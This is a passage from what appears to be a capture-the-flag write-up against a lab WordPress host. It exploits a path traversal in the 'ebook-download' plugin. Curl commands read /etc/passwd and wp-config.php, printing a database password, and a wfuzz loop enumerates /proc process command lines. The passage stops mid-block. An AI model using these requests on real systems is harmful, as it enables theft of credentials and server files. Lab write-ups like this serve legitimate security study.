</span></span><span style=display:flex><span>Donate link: https://www.paypal.com/cgi-bin/webscr?cmd=_donations&amp;business=3ZVGZTC7ZPCH2&amp;lc=CZ&amp;item_name=Zedna%20Brickick%20Website&amp;currency_code=USD&amp;bn=PP%2dDonationsBF%3abtn_donateCC_LG%2egif%3aNonHosted
</span></span><span style=display:flex><span>Tags: ebook, file, download
</span></span><span style=display:flex><span>Requires at least: 3.0.4
</span></span><span style=display:flex><span>Tested up to: 4.4
</span></span><span style=display:flex><span>Stable tag: 1.1
</span></span><span style=display:flex><span>License: GPLv2 or later
</span></span><span style=display:flex><span>License URI: http://www.gnu.org/licenses/gpl-2.0.htm
</span></span></code></pre></div><p><code>Stable tag: 1.1</code></p><p>Curl</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>curl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl<span style=color:#f92672>=</span>/etc/passwd &gt; passwd.txt
</span></span></code></pre></div><p><code>passwd.txt</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>/</span>etc<span style=color:#f92672>/</span>passwd<span style=color:#f92672>/</span>etc<span style=color:#f92672>/</span>passwd<span style=color:#f92672>/</span>etc<span style=color:#f92672>/</span>passwdroot:x:<span style=color:#ae81ff>0</span>:<span style=color:#ae81ff>0</span>:root:<span style=color:#f92672>/</span>root:<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>bash
</span></span><span style=display:flex><span>daemon:x:<span style=color:#ae81ff>1</span>:<span style=color:#ae81ff>1</span>:daemon:<span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>sbin:<span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>sbin<span style=color:#f92672>/</span>nologin
</span></span><span style=display:flex><span>bin:x:<span style=color:#ae81ff>2</span>:<span style=color:#ae81ff>2</span>:bin:<span style=color:#f92672>/</span>bin:<span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>sbin<span style=color:#f92672>/</span>nologin
</span></span><span style=display:flex><span>sys:x:<span style=color:#ae81ff>3</span>:<span style=color:#ae81ff>3</span>:sys:<span style=color:#f92672>/</span>dev:<span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>sbin<span style=color:#f92672>/</span>nologin
</span></span><span style=display:flex><span>sync:x:<span style=color:#ae81ff>4</span>:<span style=color:#ae81ff>65534</span>:sync:<span style=color:#f92672>/</span>bin:<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>sync
</span></span><span style=display:flex><span>games:x:<span style=color:#ae81ff>5</span>:<span style=color:#ae81ff>60</span>:games:<span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>games:<span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>sbin<span style=color:#f92672>/</span>nologin
</span></span><span style=display:flex><span>man:x:<span style=color:#ae81ff>6</span>:<span style=color:#ae81ff>12</span>:man:<span style=color:#f92672>/</span>var<span style=color:#f92672>/</span>cache<span style=color:#f92672>/</span>man:<span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>sbin<span style=color:#f92672>/</span>nologin
</span></span><span style=display:flex><span>lp:x:<span style=color:#ae81ff>7</span>:<span style=color:#ae81ff>7</span>:lp:<span style=color:#f92672>/</span>var<span style=color:#f92672>/</span>spool<span style=color:#f92672>/</span>lpd:<span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>sbin<span style=color:#f92672>/</span>nologin
</span></span><span style=display:flex><span>mail:x:<span style=color:#ae81ff>8</span>:<span style=color:#ae81ff>8</span>:mail:<span style=color:#f92672>/</span>var<span style=color:#f92672>/</span>mail:<span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>sbin<span style=color:#f92672>/</span>nologin
</span></span><span style=display:flex><span>news:x:<span style=color:#ae81ff>9</span>:<span style=color:#ae81ff>9</span>:news:<span style=color:#f92672>/</span>var<span style=color:#f92672>/</span>spool<span style=color:#f92672>/</span>news:<span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>sbin<span style=color:#f92672>/</span>nologin
</span></span><span style=display:flex><span>uucp:x:<span style=color:#ae81ff>10</span>:<span style=color:#ae81ff>10</span>:uucp:<span style=color:#f92672>/</span>var<span style=color:#f92672>/</span>spool<span style=color:#f92672>/</span>uucp:<span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>sbin<span style=color:#f92672>/</span>nologin
</span></span><span style=display:flex><span>proxy:x:<span style=color:#ae81ff>13</span>:<span style=color:#ae81ff>13</span>:proxy:<span style=color:#f92672>/</span>bin:<span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>sbin<span style=color:#f92672>/</span>nologin
</span></span><span style=display:flex><span>www<span style=color:#f92672>-</span>data:x:<span style=color:#ae81ff>33</span>:<span style=color:#ae81ff>33</span>:www<span style=color:#f92672>-</span>data:<span style=color:#f92672>/</span>var<span style=color:#f92672>/</span>www:<span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>sbin<span style=color:#f92672>/</span>nologin
</span></span><span style=display:flex><span>backup:x:<span style=color:#ae81ff>34</span>:<span style=color:#ae81ff>34</span>:backup:<span style=color:#f92672>/</span>var<span style=color:#f92672>/</span>backups:<span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>sbin<span style=color:#f92672>/</span>nologin
</span></span><span style=display:flex><span>list:x:<span style=color:#ae81ff>38</span>:<span style=color:#ae81ff>38</span>:Mailing List Manager:<span style=color:#f92672>/</span>var<span style=color:#f92672>/</span>list:<span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>sbin<span style=color:#f92672>/</span>nologin
</span></span><span style=display:flex><span>irc:x:<span style=color:#ae81ff>39</span>:<span style=color:#ae81ff>39</span>:ircd:<span style=color:#f92672>/</span>var<span style=color:#f92672>/</span>run<span style=color:#f92672>/</span>ircd:<span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>sbin<span style=color:#f92672>/</span>nologin
</span></span><span style=display:flex><span>gnats:x:<span style=color:#ae81ff>41</span>:<span style=color:#ae81ff>41</span>:Gnats Bug<span style=color:#f92672>-</span>Reporting System (admin):<span style=color:#f92672>/</span>var<span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>gnats:<span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>sbin<span style=color:#f92672>/</span>nologin
</span></span><span style=display:flex><span>nobody:x:<span style=color:#ae81ff>65534</span>:<span style=color:#ae81ff>65534</span>:nobody:<span style=color:#f92672>/</span>nonexistent:<span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>sbin<span style=color:#f92672>/</span>nologin
</span></span><span style=display:flex><span>systemd<span style=color:#f92672>-</span>network:x:<span style=color:#ae81ff>100</span>:<span style=color:#ae81ff>102</span>:systemd Network Management,,,:<span style=color:#f92672>/</span>run<span style=color:#f92672>/</span>systemd:<span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>sbin<span style=color:#f92672>/</span>nologin
</span></span><span style=display:flex><span>systemd<span style=color:#f92672>-</span>resolve:x:<span style=color:#ae81ff>101</span>:<span style=color:#ae81ff>103</span>:systemd Resolver,,,:<span style=color:#f92672>/</span>run<span style=color:#f92672>/</span>systemd:<span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>sbin<span style=color:#f92672>/</span>nologin
</span></span><span style=display:flex><span>systemd<span style=color:#f92672>-</span>timesync:x:<span style=color:#ae81ff>102</span>:<span style=color:#ae81ff>104</span>:systemd Time Synchronization,,,:<span style=color:#f92672>/</span>run<span style=color:#f92672>/</span>systemd:<span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>sbin<span style=color:#f92672>/</span>nologin
</span></span><span style=display:flex><span>messagebus:x:<span style=color:#ae81ff>103</span>:<span style=color:#ae81ff>106</span>::<span style=color:#f92672>/</span>nonexistent:<span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>sbin<span style=color:#f92672>/</span>nologin
</span></span><span style=display:flex><span>syslog:x:<span style=color:#ae81ff>104</span>:<span style=color:#ae81ff>110</span>::<span style=color:#f92672>/</span>home<span style=color:#f92672>/</span>syslog:<span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>sbin<span style=color:#f92672>/</span>nologin
</span></span><span style=display:flex><span>_apt:x:<span style=color:#ae81ff>105</span>:<span style=color:#ae81ff>65534</span>::<span style=color:#f92672>/</span>nonexistent:<span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>sbin<span style=color:#f92672>/</span>nologin
</span></span><span style=display:flex><span>tss:x:<span style=color:#ae81ff>106</span>:<span style=color:#ae81ff>111</span>:TPM software stack,,,:<span style=color:#f92672>/</span>var<span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>tpm:<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>false
</span></span><span style=display:flex><span>uuidd:x:<span style=color:#ae81ff>107</span>:<span style=color:#ae81ff>112</span>::<span style=color:#f92672>/</span>run<span style=color:#f92672>/</span>uuidd:<span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>sbin<span style=color:#f92672>/</span>nologin
</span></span><span style=display:flex><span>tcpdump:x:<span style=color:#ae81ff>108</span>:<span style=color:#ae81ff>113</span>::<span style=color:#f92672>/</span>nonexistent:<span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>sbin<span style=color:#f92672>/</span>nologin
</span></span><span style=display:flex><span>landscape:x:<span style=color:#ae81ff>109</span>:<span style=color:#ae81ff>115</span>::<span style=color:#f92672>/</span>var<span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>landscape:<span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>sbin<span style=color:#f92672>/</span>nologin
</span></span><span style=display:flex><span>pollinate:x:<span style=color:#ae81ff>110</span>:<span style=color:#ae81ff>1</span>::<span style=color:#f92672>/</span>var<span style=color:#f92672>/</span>cache<span style=color:#f92672>/</span>pollinate:<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>false
</span></span><span style=display:flex><span>usbmux:x:<span style=color:#ae81ff>111</span>:<span style=color:#ae81ff>46</span>:usbmux daemon,,,:<span style=color:#f92672>/</span>var<span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>usbmux:<span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>sbin<span style=color:#f92672>/</span>nologin
</span></span><span style=display:flex><span>sshd:x:<span style=color:#ae81ff>112</span>:<span style=color:#ae81ff>65534</span>::<span style=color:#f92672>/</span>run<span style=color:#f92672>/</span>sshd:<span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>sbin<span style=color:#f92672>/</span>nologin
</span></span><span style=display:flex><span>systemd<span style=color:#f92672>-</span>coredump:x:<span style=color:#ae81ff>999</span>:<span style=color:#ae81ff>999</span>:systemd Core Dumper:<span style=color:#f92672>/</span>:<span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>sbin<span style=color:#f92672>/</span>nologin
</span></span><span style=display:flex><span>user:x:<span style=color:#ae81ff>1000</span>:<span style=color:#ae81ff>1000</span>:user:<span style=color:#f92672>/</span>home<span style=color:#f92672>/</span>user:<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>bash
</span></span><span style=display:flex><span>lxd:x:<span style=color:#ae81ff>998</span>:<span style=color:#ae81ff>100</span>::<span style=color:#f92672>/</span>var<span style=color:#f92672>/</span>snap<span style=color:#f92672>/</span>lxd<span style=color:#f92672>/</span>common<span style=color:#f92672>/</span>lxd:<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>false
</span></span><span style=display:flex><span>mysql:x:<span style=color:#ae81ff>113</span>:<span style=color:#ae81ff>118</span>:MySQL Server,,,:<span style=color:#f92672>/</span>nonexistent:<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>false
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span>script<span style=color:#f92672>&gt;</span>window<span style=color:#f92672>.</span>close()<span style=color:#f92672>&lt;/</span>script<span style=color:#f92672>&gt;</span>
</span></span></code></pre></div><p>curl</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>curl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl<span style=color:#f92672>=</span>../../../wp-config.php &gt; wp-config.php
</span></span></code></pre></div><p><code>wp-config.php</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>../../../</span><span style=color:#a6e22e>wp</span><span style=color:#f92672>-</span><span style=color:#a6e22e>config</span><span style=color:#f92672>.</span><span style=color:#a6e22e>php</span><span style=color:#f92672>../../../</span><span style=color:#a6e22e>wp</span><span style=color:#f92672>-</span><span style=color:#a6e22e>config</span><span style=color:#f92672>.</span><span style=color:#a6e22e>php</span><span style=color:#f92672>../../../</span><span style=color:#a6e22e>wp</span><span style=color:#f92672>-</span><span style=color:#a6e22e>config</span><span style=color:#f92672>.</span><span style=color:#a6e22e>php</span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#e6db74>/**
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * The base configuration for WordPress
</span></span></span><span style=display:flex><span><span style=color:#e6db74> *
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * The wp-config.php creation script uses this file during the installation.
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * You don&#39;t have to use the web site, you can copy this file to &#34;wp-config.php&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * and fill in the values.
</span></span></span><span style=display:flex><span><span style=color:#e6db74> *
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * This file contains the following configurations:
</span></span></span><span style=display:flex><span><span style=color:#e6db74> *
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * * MySQL settings
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * * Secret keys
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * * Database table prefix
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * * ABSPATH
</span></span></span><span style=display:flex><span><span style=color:#e6db74> *
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * @link https://wordpress.org/support/article/editing-wp-config-php/
</span></span></span><span style=display:flex><span><span style=color:#e6db74> *
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * @package WordPress
</span></span></span><span style=display:flex><span><span style=color:#e6db74> */</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// ** MySQL settings - You can get this info from your web host ** //
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#e6db74>/** The name of the database for WordPress */</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>( <span style=color:#e6db74>&#39;DB_NAME&#39;</span>, <span style=color:#e6db74>&#39;wordpress&#39;</span> );
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>/** MySQL database username */</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>( <span style=color:#e6db74>&#39;DB_USER&#39;</span>, <span style=color:#e6db74>&#39;wordpressuser&#39;</span> );
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>/** MySQL database password */</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>( <span style=color:#e6db74>&#39;DB_PASSWORD&#39;</span>, <span style=color:#e6db74>&#39;MQYBJSaD#DxG6qbm&#39;</span> );
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>/** MySQL hostname */</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>( <span style=color:#e6db74>&#39;DB_HOST&#39;</span>, <span style=color:#e6db74>&#39;localhost&#39;</span> );
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>/** Database charset to use in creating database tables. */</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>( <span style=color:#e6db74>&#39;DB_CHARSET&#39;</span>, <span style=color:#e6db74>&#39;utf8&#39;</span> );
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>/** The database collate type. Don&#39;t change this if in doubt. */</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>( <span style=color:#e6db74>&#39;DB_COLLATE&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span> );
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>/**#@+
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * Authentication unique keys and salts.
</span></span></span><span style=display:flex><span><span style=color:#e6db74> *
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * Change these to different unique phrases! You can generate these using
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
</span></span></span><span style=display:flex><span><span style=color:#e6db74> *
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * You can change these at any point in time to invalidate all existing cookies.
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * This will force all users to have to log in again.
</span></span></span><span style=display:flex><span><span style=color:#e6db74> *
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * @since 2.6.0
</span></span></span><span style=display:flex><span><span style=color:#e6db74> */</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>/* That&#39;s all, stop editing! Happy blogging. */</span>
</span></span><span style=display:flex><span><span style=color:#e6db74>/** Absolute path to the WordPress directory. */</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ( <span style=color:#f92672>!</span><span style=color:#a6e22e>defined</span>(<span style=color:#e6db74>&#39;ABSPATH&#39;</span>) )
</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>(<span style=color:#e6db74>&#39;ABSPATH&#39;</span>, <span style=color:#a6e22e>dirname</span>(<span style=color:#66d9ef>__FILE__</span>) <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;/&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#75715e>/* THIS IS CUSTOM CODE CREATED AT ZEROFRACTAL TO MAKE SITE ACCESS DYNAMIC */</span>
</span></span><span style=display:flex><span>$currenthost <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://&#34;</span><span style=color:#f92672>.</span>$_SERVER[<span style=color:#e6db74>&#39;HTTP_HOST&#39;</span>];
</span></span><span style=display:flex><span>$currentpath <span style=color:#f92672>=</span> <span style=color:#a6e22e>preg_replace</span>(<span style=color:#e6db74>&#39;@/+$@&#39;</span>,<span style=color:#e6db74>&#39;&#39;</span>,<span style=color:#a6e22e>dirname</span>($_SERVER[<span style=color:#e6db74>&#39;SCRIPT_NAME&#39;</span>]));
</span></span><span style=display:flex><span>$currentpath <span style=color:#f92672>=</span> <span style=color:#a6e22e>preg_replace</span>(<span style=color:#e6db74>&#39;/\/wp.+/&#39;</span>,<span style=color:#e6db74>&#39;&#39;</span>,$currentpath);
</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>(<span style=color:#e6db74>&#39;WP_HOME&#39;</span>,$currenthost<span style=color:#f92672>.</span>$currentpath);
</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>(<span style=color:#e6db74>&#39;WP_SITEURL&#39;</span>,$currenthost<span style=color:#f92672>.</span>$currentpath);
</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>(<span style=color:#e6db74>&#39;WP_CONTENT_URL&#39;</span>, $currenthost<span style=color:#f92672>.</span>$currentpath<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;/wp-content&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>(<span style=color:#e6db74>&#39;WP_PLUGIN_URL&#39;</span>, $currenthost<span style=color:#f92672>.</span>$currentpath<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;/wp-content/plugins&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>(<span style=color:#e6db74>&#39;DOMAIN_CURRENT_SITE&#39;</span>, $currenthost<span style=color:#f92672>.</span>$currentpath );
</span></span><span style=display:flex><span><span style=color:#f92672>@</span><span style=color:#a6e22e>define</span>(<span style=color:#e6db74>&#39;ADMIN_COOKIE_PATH&#39;</span>, <span style=color:#e6db74>&#39;./&#39;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>( <span style=color:#e6db74>&#39;AUTH_KEY&#39;</span>,         <span style=color:#e6db74>&#39;put your unique phrase here&#39;</span> );
</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>( <span style=color:#e6db74>&#39;SECURE_AUTH_KEY&#39;</span>,  <span style=color:#e6db74>&#39;put your unique phrase here&#39;</span> );
</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>( <span style=color:#e6db74>&#39;LOGGED_IN_KEY&#39;</span>,    <span style=color:#e6db74>&#39;put your unique phrase here&#39;</span> );
</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>( <span style=color:#e6db74>&#39;NONCE_KEY&#39;</span>,        <span style=color:#e6db74>&#39;put your unique phrase here&#39;</span> );
</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>( <span style=color:#e6db74>&#39;AUTH_SALT&#39;</span>,        <span style=color:#e6db74>&#39;put your unique phrase here&#39;</span> );
</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>( <span style=color:#e6db74>&#39;SECURE_AUTH_SALT&#39;</span>, <span style=color:#e6db74>&#39;put your unique phrase here&#39;</span> );
</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>( <span style=color:#e6db74>&#39;LOGGED_IN_SALT&#39;</span>,   <span style=color:#e6db74>&#39;put your unique phrase here&#39;</span> );
</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>( <span style=color:#e6db74>&#39;NONCE_SALT&#39;</span>,       <span style=color:#e6db74>&#39;put your unique phrase here&#39;</span> );
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>/**#@-*/</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>/**
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * WordPress database table prefix.
</span></span></span><span style=display:flex><span><span style=color:#e6db74> *
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * You can have multiple installations in one database if you give each
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * a unique prefix. Only numbers, letters, and underscores please!
</span></span></span><span style=display:flex><span><span style=color:#e6db74> */</span>
</span></span><span style=display:flex><span>$table_prefix <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;wp_&#39;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>/**
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * For developers: WordPress debugging mode.
</span></span></span><span style=display:flex><span><span style=color:#e6db74> *
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * Change this to true to enable the display of notices during development.
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * It is strongly recommended that plugin and theme developers use WP_DEBUG
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * in their development environments.
</span></span></span><span style=display:flex><span><span style=color:#e6db74> *
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * For information on other constants that can be used for debugging,
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * visit the documentation.
</span></span></span><span style=display:flex><span><span style=color:#e6db74> *
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * @link https://wordpress.org/support/article/debugging-in-wordpress/
</span></span></span><span style=display:flex><span><span style=color:#e6db74> */</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>( <span style=color:#e6db74>&#39;WP_DEBUG&#39;</span>, <span style=color:#66d9ef>false</span> );
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>/* Add any custom values between this line and the &#34;stop editing&#34; line. */</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>/* That&#39;s all, stop editing! Happy publishing. */</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>/** Absolute path to the WordPress directory. */</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ( <span style=color:#f92672>!</span> <span style=color:#a6e22e>defined</span>( <span style=color:#e6db74>&#39;ABSPATH&#39;</span> ) ) {
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>define</span>( <span style=color:#e6db74>&#39;ABSPATH&#39;</span>, <span style=color:#66d9ef>__DIR__</span> <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;/&#39;</span> );
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>/** Sets up WordPress vars and included files. */</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>require_once</span> <span style=color:#a6e22e>ABSPATH</span> <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;wp-settings.php&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>script</span><span style=color:#f92672>&gt;</span><span style=color:#a6e22e>window</span><span style=color:#f92672>.</span><span style=color:#a6e22e>close</span>()<span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>script</span><span style=color:#f92672>&gt;</span>
</span></span></code></pre></div><p>wfuzz:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>wfuzz -u http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl<span style=color:#f92672>=</span>/proc/FUZZ/cmdline -z range,1-1000 --hw <span style=color:#ae81ff>1</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>=====================================================================</span>
</span></span><span style=display:flex><span>ID           Response   Lines    Word       Chars       Payload                                                      
</span></span><span style=display:flex><span><span style=color:#f92672>=====================================================================</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>000000840:   <span style=color:#ae81ff>200</span>        <span style=color:#ae81ff>0</span> L      <span style=color:#ae81ff>12</span> W       <span style=color:#ae81ff>183</span> Ch      <span style=color:#e6db74>&#34;840&#34;</span>                                                        
</span></span><span style=display:flex><span>000000842:   <span style=color:#ae81ff>200</span>        <span style=color:#ae81ff>0</span> L      <span style=color:#ae81ff>11</span> W       <span style=color:#ae81ff>181</span> Ch      <span style=color:#e6db74>&#34;842&#34;</span>                                                        
</span></span><span style=display:flex><span>000000836:   <span style=color:#ae81ff>200</span>        <span style=color:#ae81ff>0</span> L      <span style=color:#ae81ff>3</span> W        <span style=color:#ae81ff>128</span> Ch      <span style=color:#e6db74>&#34;836&#34;</span>                                                        
</span></span><span style=display:flex><span>000000852:   <span style=color:#ae81ff>200</span>        <span style=color:#ae81ff>0</span> L      <span style=color:#ae81ff>8</span> W        <span style=color:#ae81ff>138</span> Ch      <span style=color:#e6db74>&#34;852&#34;</span>                                                        
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Total time: <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>Processed Requests: <span style=color:#ae81ff>1000</span>
</span></span><span style=display:flex><span>Filtered Requests: <span style=color:#ae81ff>996</span>
</span></span><span style=display:flex><span>Requests/sec.: <span style=color:#ae81ff>0</span>
</span></span></code></pre></div><p>curl
840</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>curl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl<span style=color:#f92672>=</span>/proc/840/cmdline &gt; 840.txt
</span></span></code></pre></div><p>842</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>curl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl<span style=color:#f92672>=</span>/proc/842/cmdline &gt; 842.txt
</span></span></code></pre></div><p>836</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>curl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl<span style=color:#f92672>=</span>/proc/836/cmdline &gt; 836.txt
</span></span></code></pre></div><p>852</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>curl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl<span style=color:#f92672>=</span>/proc/852/cmdline &gt; 852.txt
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#840</span>
